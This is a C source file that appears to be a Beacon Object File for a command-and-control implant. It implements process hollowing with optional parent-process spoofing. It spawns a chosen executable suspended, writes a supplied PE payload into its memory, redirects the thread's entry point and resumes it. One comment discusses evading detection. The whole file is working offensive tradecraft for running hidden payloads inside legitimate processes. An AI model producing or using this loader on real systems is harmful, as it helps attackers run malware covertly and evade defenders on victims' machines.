#include "bof.h"

void go( char* args, int argc )
{
    datap           Parser          = { 0 };
    int             PPid            = 0,
                    PayloadSize     = 0;
    char            *ExePayload     = 0,
                    *PathToHollow   = 0,
                    Failed          = 1;
    void            *PProcessHandle = 0,
                    *RemoteMemory   = 0,
                    *RemoteMemory2  = 0;
    size_t          AttrListSize    = 0,
                    RegionSize      = 0,
                    BytesWritten    = 0;
    unsigned long   Protection      = 0,
                    OldProtection   = 0;

    NTSTATUS                    Status          = 0;
    PROCESS_INFORMATION         Pi              = { 0 };
    STARTUPINFOA                Si              = { .cb = sizeof( STARTUPINFOA ) };
    STARTUPINFOEXA              SiEx            = { .StartupInfo.cb = sizeof( STARTUPINFOEXA ) };
    PPROC_THREAD_ATTRIBUTE_LIST ThreadAttrList  = 0;
    PIMAGE_NT_HEADERS           NtHeaders       = 0;
    PIMAGE_SECTION_HEADER       Section         = 0;    
    CONTEXT                     Ctx             = { .ContextFlags = CONTEXT_INTEGER };

    /* 
        Create parser and extract beacon arguments

        NOTE: BoF arguments are extracted in the order
              the are packed into the buffer. 
    */
    BeaconDataParse( &Parser, args, argc );
    PathToHollow = BeaconDataExtract( &Parser, 0 );
    PPid         = BeaconDataInt( &Parser );
    ExePayload   = BeaconDataExtract( &Parser, &PayloadSize );

    DBG("Retrieved arguments:\n"
        "- Hollow Target Image: %s\n" 
        "- Parent Process Id: %d\n" 
        "- PayloadSize: %d\n"
        "- Payload Address: 0x%p\n", PathToHollow, PPid, PayloadSize, ExePayload);
    
    NtHeaders = ( PIMAGE_NT_HEADERS )( ExePayload + ( ( PIMAGE_DOS_HEADER )ExePayload )->e_lfanew );
    if ( NtHeaders->Signature != IMAGE_NT_SIGNATURE )
    {
        MSG( "Input data is not valid." );
        return;
    }

    /*
        Create the target process. If a parent process id was supplied, acquire a handle
        to the target parent to use for spoofing during process creation.

        NOTE: This can still be detected via 'Parent Console' field in system informer.
              The parent console is still inherited from this process even though the
              Parent process field will show the target process id when viewing the 
              process properties. I tested various things to change this however none worked.
              I have further ideas but i can't get hung up on it at the moment.
    */
    if ( PPid != 0 ) 
    {
        if ( ( PProcessHandle = Kernel32$OpenProcess( PROCESS_CREATE_PROCESS, FALSE, PPid ) ) == NULL )
        {
            ERR( "OpenProcess" );
            return;
        }

        Kernel32$InitializeProcThreadAttributeList( 0, 1, 0, &AttrListSize );
    
        if ( ( ThreadAttrList = ( PPROC_THREAD_ATTRIBUTE_LIST )Kernel32$HeapAlloc( 
            Kernel32$GetProcessHeap(), 
            HEAP_ZERO_MEMORY, 
            AttrListSize 
        ) ) == NULL ) 
        {
            ERR( "HeapAlloc" );
            return;
        }

        if ( !Kernel32$InitializeProcThreadAttributeList( ThreadAttrList, 1, 0, &AttrListSize ) )
        {
            ERR( "InitializeProcThreadAttributeList" );
            return;
        }

        if ( !Kernel32$UpdateProcThreadAttribute( 
                ThreadAttrList, 
                0, 
                PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, 
                &PProcessHandle, 
                sizeof( void* ), 
                0, 
                0 
            ) 
        ) {
            ERR( "UpdateProcThreadAttribute" );
            return;
        }

        SiEx.lpAttributeList = ThreadAttrList;

        if ( !Kernel32$CreateProcessA( 0, PathToHollow, 0, 0, 0, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, 0, "C:\\Windows\\System32", &SiEx.StartupInfo, &Pi ) ) 
        {
            ERR( "CreateProcessA" );
            return;
        }
    } 
    else 
    {
        if ( !Kernel32$CreateProcessA( 0, PathToHollow, 0, 0, 0, CREATE_SUSPENDED, 0, "C:\\Windows\\System32", &Si, &Pi ) ) {
            ERR( "CreateProcessA" );
            return;
        }
    }

    DBG( "Spawned new %s process [pid %d]", PathToHollow, Pi.dwProcessId );

    /*
        Allocate memory for payload in target process
    */
    RemoteMemory  = ( void* )NtHeaders->OptionalHeader.ImageBase;
    RegionSize    = NtHeaders->OptionalHeader.SizeOfImage;
    if ( ( Status = Ntdll$NtAllocateVirtualMemory( 
            Pi.hProcess, 
            &RemoteMemory, 
            0, 
            &RegionSize, 
            MEM_COMMIT | MEM_RESERVE, 
            PAGE_READWRITE
        ) 
    ) != 0x0 ) 
    {
        NTERR( "NtAllocateVirtualMemory", Status );
        return;
    }
    DBG( "Allocated buffer at 0x%p in %d", RemoteMemory, Pi.dwProcessId );

    /* 
        Verify memory was allocated at the correct address otherwise this hollowing method will fails. 
    */
    if ( RemoteMemory != ( void* )NtHeaders->OptionalHeader.ImageBase )
    {
        RegionSize = 0;
        Ntdll$NtFreeVirtualMemory( Pi.hProcess, &RemoteMemory, &RegionSize, MEM_RELEASE );
        MSG( "Memory was not allocated at correct address. Quitting.");
        return;
    }

    /*
        Write the executable to the memory address
    */
    if ( ( Status = Ntdll$NtWriteVirtualMemory( 
            Pi.hProcess,
            RemoteMemory,
            ExePayload,
            NtHeaders->OptionalHeader.SizeOfHeaders,
            &BytesWritten
        )
    ) != 0x0 || BytesWritten != NtHeaders->OptionalHeader.SizeOfHeaders )
    {
        NTERR( "NtWriteVirtualMemory", Status );
        return;
    } 
    
    Section = IMAGE_FIRST_SECTION( NtHeaders );
    for ( int i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++ )
    {
        if ( ( Status = Ntdll$NtWriteVirtualMemory( 
              Pi.hProcess, 
              ( void* )( ( char* )RemoteMemory + Section[i].VirtualAddress ), 
              ( void* )( ( char* )ExePayload + Section[i].PointerToRawData ),
              Section[i].SizeOfRawData,
              &BytesWritten 
           )
        ) != 0x0 )
        {
            NTERR( "NtWriteVirtualMemory", Status );
            return;
        }
    } 

    DBG( "Wrote payload to buffer. [%zu bytes]", BytesWritten );

    /*
        Update PPEB->ImageBaseAddress with the base address of the payload
    */
    if ( ( Status = Ntdll$NtGetContextThread( Pi.hThread, &Ctx ) ) != 0x0 )
    {
        NTERR( "NtGetContextThread", Status );
        return;
    }

    if ( ( Status = Ntdll$NtWriteVirtualMemory(
            Pi.hProcess,
            ( void* )( Ctx.Rdx + 0x10 ),
            &RemoteMemory,
            sizeof( void* ),
            &BytesWritten
        ) 
    ) != 0x0 )
    {
        NTERR("NtWriteVirtualMemory", Status );
        return;
    }
    DBG( "Updated PEB->ImageBaseAddress to 0x%p. [Rdx 0x%p]", RemoteMemory, Ctx.Rdx );

    /*
        Setup correct memory permissions for each section
    */
    for ( int i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++ )
    {
        if ( !Section[i].SizeOfRawData || !Section[i].VirtualAddress )
        {
            continue;
        }

        if ( Section[i].Characteristics & IMAGE_SCN_MEM_READ )
            Protection = PAGE_READONLY;

        if ( Section[i].Characteristics & IMAGE_SCN_MEM_WRITE )
            Protection = PAGE_WRITECOPY;

        if ( Section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE )
            Protection = PAGE_EXECUTE;

        if ( ( Section[i].Characteristics & IMAGE_SCN_MEM_READ ) && ( Section[i].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( Section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) )
            Protection = PAGE_EXECUTE_READWRITE;

        if ( ( Section[i].Characteristics & IMAGE_SCN_MEM_READ ) && ( Section[i].Characteristics & IMAGE_SCN_MEM_WRITE ) )
            Protection = PAGE_READWRITE;

        if ( ( Section[i].Characteristics & IMAGE_SCN_MEM_READ ) && ( Section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) )
            Protection = PAGE_EXECUTE_READ;

        if ( ( Section[i].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( Section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) )
            Protection = PAGE_EXECUTE_WRITECOPY;
    
        RegionSize    = Section[i].SizeOfRawData;
        RemoteMemory2 = ( void* )( ( char* )RemoteMemory + Section[i].VirtualAddress );
        if ( ( Status = Ntdll$NtProtectVirtualMemory( 
                Pi.hProcess,
                &RemoteMemory2,
                &RegionSize,
                Protection, 
                &OldProtection 
        ) ) != 0x0 )
        {
            NTERR( "NtProtectVirtualMemory", Status );
            return;
        }
    }
    DBG( "Applied memory permissions" );
    
    /*
        Set RCX to the payload entry point
    */
    Ctx.Rcx = ( unsigned long long )RemoteMemory + NtHeaders->OptionalHeader.AddressOfEntryPoint;
    if ( ( Status = Ntdll$NtSetContextThread( Pi.hThread, &Ctx ) ) != 0x0 )
    {
        NTERR( "NtSetThreadContext", Status );
        return;
    }
    
    /*
        Execute the payload
    */
    if ( ( Status = Ntdll$NtResumeThread( Pi.hThread, 0 ) ) != 0x0 )
    {
        NTERR( "NtResumeThread", Status );
        return;
    }

    Failed = 0;

cleanup:
    if ( Failed && RemoteMemory) {
        RegionSize = 0;
        Ntdll$NtFreeVirtualMemory( Pi.hProcess, RemoteMemory, &RegionSize, MEM_RELEASE );
    }

    if ( PProcessHandle )   { Ntdll$NtClose( PProcessHandle ); }
    if ( Pi.hProcess )      { Ntdll$NtClose( Pi.hProcess ); }
    if ( Pi.hThread )       { Ntdll$NtClose( Pi.hThread); }

    if ( ThreadAttrList ) {
        Kernel32$DeleteProcThreadAttributeList( ThreadAttrList );
        Kernel32$HeapFree( Kernel32$GetProcessHeap(), 0, ThreadAttrList );
    }

    MSG( "[+] Spawned new %s [%d] process and injected payload via process hollowing [%d bytes]", PathToHollow, Pi.dwProcessId, PayloadSize );
    return;
}